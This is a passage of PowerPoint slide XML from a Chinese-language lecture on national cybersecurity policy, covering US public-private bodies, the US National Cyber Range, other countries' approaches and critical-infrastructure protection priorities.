                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>公私合作机构：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家基础设施顾问委员会（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>NIAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息共享和分析中心（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>ISAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络安全全国联盟（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>NCSA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="13" name="组合 12"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4923113" y="2700525"/>
            <a:ext cx="3537319" cy="2292251"/>
            <a:chOff x="4923113" y="2700525"/>
            <a:chExt cx="3537319" cy="2292251"/>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3113" y="2784305"/>
              <a:ext cx="1026930" cy="1026930"/>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5209" y="2784304"/>
              <a:ext cx="992953" cy="989971"/>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2722" y="2700525"/>
              <a:ext cx="1117710" cy="1088515"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="8" name="图片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48590" y="3879964"/>
              <a:ext cx="1063570" cy="1095319"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="9" name="图片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45167" y="3929639"/>
              <a:ext cx="1063137" cy="1063137"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="12" name="图片 11"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId7"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="7372342" y="3997052"/>
              <a:ext cx="942975" cy="800100"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33446268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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="122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2">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1229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2">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2292">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1229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2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2" fill="hold" nodeType="after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1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="29"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additive="base">
                                        <p:cTn id="34" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="3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build="p"/>
      <p:bldP spid="2" grpId="0"/>
      <p:bldP spid="3" grpId="0"/>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Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="193251" y="711215"/>
            <a:ext cx="8832666" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>美国国家网络靶场：新世纪的“曼哈顿”计划</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="15" name="组合 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="140226" y="1282541"/>
            <a:ext cx="8904920" cy="4980557"/>
            <a:chOff x="140226" y="1282541"/>
            <a:chExt cx="8904920" cy="4980557"/>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226" y="1282541"/>
              <a:ext cx="3074113" cy="2074451"/>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226" y="3356994"/>
              <a:ext cx="3074113" cy="2898241"/>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82713" y="1292250"/>
              <a:ext cx="2918440" cy="2040432"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="12" name="图片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03848" y="3356992"/>
              <a:ext cx="3051814" cy="2898243"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="11" name="图片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218" y="1292139"/>
              <a:ext cx="2948927" cy="1995489"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="9" name="图片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32778" y="3287740"/>
              <a:ext cx="2912367" cy="1437406"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="10"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32780" y="4725257"/>
              <a:ext cx="2912366" cy="1537841"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="图片 1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52" y="1282541"/>
            <a:ext cx="9136347" cy="4972694"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="文本框 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BAD5DF74-3A30-C644-BCB7-4056B1F94B3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3685990" y="1339810"/>
            <a:ext cx="5139344" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en" altLang="zh-CN" sz="1200" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1"/>
              <a:t>www.bilibili.com</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en" altLang="zh-CN" sz="1200" dirty="0"/>
              <a:t>/video/BV12v411i7Bv/?</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en" altLang="zh-CN" sz="1200" dirty="0" err="1"/>
              <a:t>spm_id_from</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en" altLang="zh-CN" sz="1200" dirty="0"/>
              <a:t>=333.337.search-card.all.click&amp;vd_source=0991c0bfd7ce6d8c34ea5d7729eaded5</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40041845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Rot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="848928" y="702653"/>
            <a:ext cx="7755520" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>其他国家网络空间安全保障体系建设动态</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15364" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1295400"/>
            <a:ext cx="8143056" cy="1557536"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>英国</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>全面紧跟美国，注重信息安全标准组织建设，注重标准向海外推广，积极参见国际信息安全标准制定</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>强化</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络监控，警方、国家安全、税务部门有权监控网络及电话</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="2879207"/>
            <a:ext cx="7951734" cy="738664"/>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200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>德国</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>第一个建立电子政务标准，注重基线安全防御</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="3675225"/>
            <a:ext cx="7951734" cy="1046440"/>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200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>法国</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>强化四大安全目标（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>领导通信、政府通信、反攻击能力、信息安全</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>纳入安全政策范围）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="556479" y="4779019"/>
            <a:ext cx="7928792" cy="1169551"/>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200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>俄罗斯</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>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注重测评</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分级管理</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28325295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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1536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364">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1536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36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364">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1536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536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616" y="703262"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>分析总结：重点保护对象</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="1998711"/>
            <a:ext cx="8191500" cy="3374505"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>各国之间历史、国情、文化不同，具体的重点保护对象也有所差异，但共同特点是将与国家安全、社会稳定和民生密切相关的关键基础设施作为信息安全保障的重点；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>国际关键信息基础设施保护手册（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
              <a:t>CIIP Handbook</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
              <a:t>2008/2009》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>显示，所有国家最常被提到的关键部门都是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>现代化社会的核心部门</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>，也是被破坏后可能造成极大规模灾害的部门；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>其中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>银行和金融</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>被全部</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
              <a:t>24</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>个接受</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
              <a:t>CIIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>调查的国家列为国家关键基础设施。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="1333058"/>
            <a:ext cx="4480714" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>关键基础设施是保障重点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35299961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703262"/>
            <a:ext cx="6768752" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>分析总结：网络空间安全组织机构</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="374229" y="3838817"/>
            <a:ext cx="8640960" cy="1152128"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>两种观念在机构设置问题上具有较大影响力：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>执法机关强调网络空间安全属于防范敌对势力入侵及网络犯罪的范畴</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>经营基础设施的部门将调信息安全属于技术问题或经济成本问题</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
